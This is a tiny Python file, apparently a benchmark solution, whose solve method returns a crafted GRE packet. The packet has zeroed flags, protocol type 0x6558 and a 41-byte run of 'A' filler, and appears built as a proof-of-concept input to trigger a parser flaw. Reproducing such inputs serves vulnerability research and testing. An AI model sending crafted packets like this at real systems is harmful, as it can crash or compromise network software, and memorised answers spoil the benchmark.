class Solution:
    def solve(self, src_path: str) -> bytes:
        gre_flags_version = b'\x00\x00'
        gre_proto = b'\x58\x65'
        payload = b'A' * 41
        return gre_flags_version + gre_proto + payload